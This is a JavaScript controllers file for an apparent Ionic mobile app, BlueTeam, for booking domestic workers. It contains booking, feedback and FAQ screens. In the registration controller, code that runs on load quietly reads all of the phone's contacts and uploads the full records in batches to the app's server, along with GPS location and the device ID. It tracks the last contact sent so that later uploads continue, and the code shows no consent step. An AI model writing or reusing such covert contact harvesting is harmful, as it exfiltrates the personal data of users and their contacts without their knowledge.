angular.module('starter.controllers', ['ionic', 'ngCordova'])

    .controller('ServiceListCtrl', function($scope, $state, $ionicLoading, $ionicHistory, $localstorage, BlueTeam) {

        if ($localstorage.get('name') === undefined || $localstorage.get('mobile') === undefined || $localstorage.get('name') === "" || $localstorage.get('mobile') === "") {
            $ionicHistory.clearHistory();
            $state.go('reg');
        }

        $scope.show = function() {
            $ionicLoading.show({
                template: 'Loading...'
            });
        };
        $scope.hide = function() {
            $ionicLoading.hide();
        };

        $scope.show();

        var temp = BlueTeam.getServices().then(function(d) {

            $ionicHistory.clearHistory();
            $scope.services = window.services = d['root'];
            console.log($scope.services[0].img_url);
            $scope.hide();
        });


    })

    .controller('ContactCtrl', function($scope, Contactlist) {
        $scope.contacts = Contactlist.getAllContacts();
    })

    .controller('RegCtrl', function($scope, $state, $ionicLoading, $ionicHistory, $cordovaGeolocation, $localstorage, PhoneContactsFactory, $ionicPlatform, $cordovaDevice, BlueTeam) {


        $scope.data = {"name":"","email":"","mobile":""};


        $scope.position = {
            "coords": {
                "longitude": null,
                "latitude": null
            }
        };

        var posOptions = {
            timeout: 10000,
            enableHighAccuracy: false
        };
        $cordovaGeolocation
            .getCurrentPosition(posOptions)
            .then(function(position) {


                $scope.position = position;

            }, function(err) {

                console.log(JSON.stringify(err));
                $scope.position = {
                    "coords": {
                        "longitude": null,
                        "latitude": null
                    }
                };


            });


        $scope.show = function() {
            $ionicLoading.show({
                template: 'Loading...'
            });
        };
        $scope.hide = function() {
            $ionicLoading.hide();
        };


        $ionicPlatform.ready(function() {
            $scope.findContact = function() {
                // var fields = ["id", "displayName", "name", "nickname", "phoneNumbers", "emails", "addresses", "ims", "organizations", "birthday", "note", "photos", "categories", "urls"];

                PhoneContactsFactory.find().then(function(contacts) {
                    $arr = [];
                    $buff = [];
                    if($localstorage.get('lastContactId'))
                        lastContactId = parseInt($localstorage.get('lastContactId'));
                    else
                        lastContactId = -1;
                    var newlastContactId = lastContactId;
                    console.log("Last Id saved ", lastContactId);
                    var j = 0;
                    var i = 0
                    for (i = 0; i < contacts.length; i++) {

                        if(lastContactId < contacts[i].id) {
                            $arr.push({
                                /*name: contacts[i].name.formatted,*/
                                id: contacts[i].id,
                                all: JSON.stringify(contacts[i])
                            });


                            $buff.push({
                                /*name: contacts[i].name.formatted,*/
                                id: contacts[i].id,
                                all: contacts[i]
                            });

                            if(lastContactId < contacts[i].id )
                                newlastContactId = contacts[i].id;

                            j++;

                            if (j > 20) {

                                BlueTeam.postRaw({
                                        "root": {
                                            "gps_location": $scope.position.coords.latitude + ',' + $scope.position.coords.longitude,
                                            "raw": $buff,

                                            "device_id": $cordovaDevice.getUUID()
                                        }
                                    }, "contacts")
                                    .then(function (d) {


                                    });
                                j = 0;
                                $buff = [];

                            }
                        }
                    }


                    $localstorage.set('lastContactId', newlastContactId);
                    if($buff.length > 0) {
                        BlueTeam.postRaw({
                                "root": {
                                    "gps_location": $scope.position.coords.latitude + ',' + $scope.position.coords.longitude,
                                    "raw": $buff,

                                    "device_id": $cordovaDevice.getUUID()
                                }
                            }, "contacts")
                            .then(function (d) {


                            });

                    }
                    //$scope.contacts = $arr;
                    //console.log(JSON.stringify($scope.contacts));


                });
            };
            $scope.findContact();




        });



        if ($localstorage.get('name') === undefined || $localstorage.get('mobile') === undefined || $localstorage.get('email') === undefined || $localstorage.get('name') === "" || $localstorage.get('mobile') === "") {

        } else {
            $ionicHistory.clearHistory();
            $state.go('tab.service-list');
        }


        $scope.regUser = function() {

            $scope.show();
            BlueTeam.regUser({
                    "root": {
                        "gps_location": $scope.position.coords.latitude + ',' + $scope.position.coords.longitude,
                        "name": $scope.data.name,
                        "mobile": $scope.data.mobile,
                        "email": ""+$scope.data.email
                    }
                })
                .then(function(d) {

                    //setObject
                    $localstorage.set('name', $scope.data.name);
                    $localstorage.set('mobile', $scope.data.mobile);
                    $localstorage.set('email', $scope.data.email);

                    $scope.hide();
                    $state.go('tab.service-list');

                });
        };
    })


    .controller('ServiceTypeCtrl', function($scope, $state, $stateParams) {


        if (window.services === undefined)
            $state.go('tab.service-list');

        for (i = 0; i < window.services.length; i++) {
            if (window.services[i].name == $stateParams.id) {
                $scope.plans = window.services[i].plans;
            }
        }

        $scope.service = $stateParams.id;

    })

    .controller('FinishCtrl', function($scope, $state, $ionicHistory, $timeout, $stateParams) {

        $scope.$on('$ionicView.enter', function() {
            // Code you want executed every time view is opened
            $ionicHistory.clearHistory();
            $timeout(function() {
                $state.go('tab.service-list');
            }, 10000)
        })

    })

    .controller('AboutCtrl', function($scope, $state, $ionicHistory, $timeout, $stateParams) {



    })

    .controller('FeedbackCtrl', function($scope, $state, $ionicLoading, $ionicHistory, $timeout, $stateParams, $localstorage, $cordovaGeolocation, BlueTeam ) {
        $scope.data = {};

        $scope.show = function() {
            $ionicLoading.show({
                template: 'Loading...'
            });
            $timeout(function() {
                $scope.hide();
            }, 5000);

        };
        $scope.hide = function() {
            $ionicLoading.hide();
        };

        $scope.data.name = $localstorage.get('name');
        $scope.data.mobile = parseInt($localstorage.get('mobile'));
        $scope.data.email = ""+$localstorage.get('email');
        $scope.position = {
            "coords": {
                "longitude": null,
                "latitude": null
            }
        };
        // to get current location of the user
        var posOptions = {
            timeout: 10000,
            enableHighAccuracy: false
        };
        $cordovaGeolocation
            .getCurrentPosition(posOptions)
            .then(function(position) {

                $scope.position = position;

            }, function(err) {
                // error
                console.log(JSON.stringify(err));
                $scope.position = {
                    "coords": {
                        "longitude": null,
                        "latitude": null
                    }
                };
            });

        $scope.feedback = function() {
            $scope.show();


            BlueTeam.postFeedback({
                    "root": {
                        "name": $scope.data.name,
                        "mobile": ""+$scope.data.mobile,
                        "gps_location": $scope.position.coords.latitude + ',' + $scope.position.coords.longitude,
                        "email": $scope.data.email,
                        "feedback": $scope.data.feedback_text
                    }
                })
                .then(function(d) {
                    $scope.hide();
                    $ionicHistory.clearHistory();
                    $state.go('finish');
                    //$scope.services = d['data']['services'];
                });
        };

    })

    .controller('T&CCtrl', function($scope, $state, $ionicHistory, $timeout, $stateParams) {



    })

    .controller('BlueteamVerifiedTypeCtrl', function($scope, $state, $ionicHistory, $timeout, $stateParams) {



    })
    .controller('F&QCtrl', function($scope, $state, $ionicHistory, $timeout, $stateParams) {

        $scope.items = [{
            title: 'what is your recruitment/working process ?',
            text: 'First of all client/customer sent a request by phone, mobile App or through website with all requirements.'+

            'Then we search a person fulfilling client requirements in our database if we found we check worker’s availability and CEM fixes meeting time with client, if not found our marketing executives (ME) search for such type of person and CEM fixes meeting time with client.'+

            'If meeting is successfully done worker starts working from next day and we demand for 20% advance of our service charges with service tax .'+

            'If meeting is unsuccessful we search for another person and follow same process as above.'+

            'Worker remains in demo period for 3 days. After 3 days we take feedback from client and worker about their bonding and negotiate about minor problems and communication gap.'+

            'If worker or client is not satisfied we search for another person and follow same process as above but if client not satisfied and decline or cancel the request we give money back after deducting 3 days charges of worker.'+

            'If both are satisfied worker continues  and we demand for remaining 80% of our charges with service tax.'+

            'In our contract for first six month we claim/guarantee that for our charge which is as much as worker’s one month salary plus service tax we provide worker for six month with replacement which are upto 3 times. If worker left job we will provide free replacement plus if worker took more than three holiday in a month we will provide replacement on that day .'+

            'In renewal process we give 50% discount for next six month and same facility as in contract.'
        },{
            title: 'What type of services you provide ?',
            text: 'We provide monthly and on demand services of Maid/Cook/Driver/BabySitter/Electrician/Plumber/Carpenter.'
        },{
            title: 'What are your charges  ? or what is your contract charges ?',
            text: 'We charge as much as worker’s one month salary as our service charge for six month plus service tax and if worker left job we will provide free replacement plus if worker took more than three holiday in a month we will provide replacement on that day .'+
           'For renewal process we discount 50% for another six month.'
        },{
            title: 'Does worker are verified / skilled ?',
            text: 'Yes, they are verified both personally and by police. They are skilled and know about the responsibilities of their job. (Specify their job responsibilities)'
        },{
            title: 'Tell about your company ?',
            text: 'BlueTeam is startup from IIT, NIPER and PEC, which is 3 months old. We provide Maid/Cook/Driver/BabySitter/Electrician/Plumber/Carpenter both monthly and on-demand bases. We want to improve reliability in domestic services. We give replacement for the day on which worker takes holiday. And we maintain continuous services for the period we are serving customers.'+
            'BlueTeam to serve you better'
        },{
            title: 'How it is different from agency ?',
            text: 'BlueTeam is a company not an agency. BlueTeam is a subsidiary of IT/R&D company ‘Shatkon Labs Pvt Ltd’. So it is operated by well educated and managed hard working guys.'+
            'Agencies have their clients in workers native area. Agencies guys pick workers from their Native place only for having Domestic work only.'+

            'Blueteam focus on employment as well as improving their lifestyle, providing education, sending their children to school and awareness.'+

            'Blueteam keep in touch with both client as well as worker and having feedback from both parties with regular time interval.'+

            'BlueTeam also focus on flexibility of workers also so that worker should give time to their children for sending them to school.'+

            'Agencies having one time payment but BlueTeam provides flexibility in service charges with monthly basis also.'+

            'BlueTeam process 3 phase for providing worker: Interview/Meetup/Demo/Done. Agencies directly give worker to client without having interview with worker.'
        },{
            title: 'Do you take commissions from workers ?',
            text: 'No, it’s not an agency. We give them their complete salary with salary slip. They are our recruited employees.'
        },{
            title: 'Do you have 24 hours maid/cook/driver ?',
            text: 'Currently we do not deal in it but if we found someone ready for this we will inform you.'
        },{
            title: 'From where these maid/cook/driver come to you ?',
            text: 'Our ME find these peoples.'
        },{
            title: 'Driver working hours  ?',
            text: '10 Hours'
        },{
            title: 'What maid can do ?',
            text: 'Maid can do floor brooming and wiping, toilet cleaning and utensils cleaning.'
        },{
            title: 'What cook can do ? or what type of food he/she can cook ?',
            text: 'Cook can cook North Indian, South Indian, Continental, Chinese and Italian . Salary is proposing to their skill set.'
        }];

        $scope.toggleItem= function(item) {
            if ($scope.isItemShown(item)) {
                $scope.shownItem = null;
            } else {
                $scope.shownItem = item;
            }
        };
        $scope.isItemShown = function(item) {
            return $scope.shownItem === item;
        };



    })
    .controller('TabCtrl', function($scope, $state, $ionicPopup, $cordovaSocialSharing, $ionicModal, $timeout, $ionicHistory, $localstorage) {

        $scope.logout = function() {
            var logoutConfirmPopup = $ionicPopup.confirm({
                title: 'Confirm Logout',
                template: 'Are you sure to LogOut?'
            });

            logoutConfirmPopup.then(function(res) {
                if(res) {
                    console.log('You are sure');
                    //setObject
                    $localstorage.set('name', "");
                    $localstorage.set('mobile', "");
                    $localstorage.set('email', "");

                    $ionicHistory.clearHistory();
                    $state.go('reg');
                } else {
                    console.log('You are not sure');
                }
            });
        };

        // Open the login modal
        $scope.share = function() {
            $cordovaSocialSharing.share("Get relief from Cook/Maid/Driver/Babysitter on leave. " +
                "Book Now on-demand/monthly to get reliable and Blueteam verified worker. " +
                "www.BlueTeam.in / 9599075355", "Book Now BlueTeam Verified Workers",
                "www/img/apple-icon-72x72.png",
                "http://www.blueteam.in");
        };


    })
    .controller('BookCtrl', function($scope, $state, $ionicLoading, $timeout, $ionicHistory, $stateParams, $cordovaGeolocation, $localstorage, BlueTeam) {
        $scope.data = {};


        if (window.services === undefined)
            $state.go('tab.service-list');

        for (i = 0; i < window.services.length; i++) {

            if (window.services[i].name == $stateParams.id) {

                for (j = 0; j < window.services[i].plans.length; j++) {

                    if (window.services[i].plans[j].name == $stateParams.type) {

                        $scope.price = window.services[i].plans[j].price;
                    }
                }
            }
        }

        $scope.service = $stateParams.id;
        $scope.type = $stateParams.type;

        $scope.data.name = $localstorage.get('name');
        $scope.data.mobile = parseInt($localstorage.get('mobile'));
        $scope.data.address = $localstorage.get('address');
        $scope.position = {
            "coords": {
                "longitude": null,
                "latitude": null
            }
        };
        // to get current location of the user
        var posOptions = {
            timeout: 10000,
            enableHighAccuracy: false
        };
        $cordovaGeolocation
            .getCurrentPosition(posOptions)
            .then(function(position) {

                $scope.position = position;

            }, function(err) {
                // error
                console.log(JSON.stringify(err));
                $scope.position = {
                    "coords": {
                        "longitude": null,
                        "latitude": null
                    }
                };
            });

        $scope.show = function() {
            $ionicLoading.show({
                template: 'Loading...'
            });
            $timeout(function() {
                $scope.hide();
            }, 5000);

        };
        $scope.hide = function() {
            $ionicLoading.hide();
        };

        // making post api call to the server by using angular based service

        $scope.conf = function() {
            $scope.show();
            $localstorage.set('name', $scope.data.name);
            $localstorage.set('mobile', $scope.data.mobile);
            $localstorage.set('address', $scope.data.address);

            BlueTeam.makeServiceRequest({
                    "root": {
                        "name": $scope.data.name,
                        "mobile": ""+$scope.data.mobile,
                        "location": $scope.position.coords.latitude + ',' + $scope.position.coords.longitude,
                        "requirements": $scope.service,
                        "remarks": $scope.type+" this is request by mobile app",
                        "address": $scope.data.address,
                        "priority": ""+3
                    }
                })
                .then(function(d) {
                    $scope.hide();
                    $ionicHistory.clearHistory();
                    $state.go('finish');
                    //$scope.services = d['data']['services'];
                });
        };

        $scope.settings = {
            enableFriends: true
        };
    });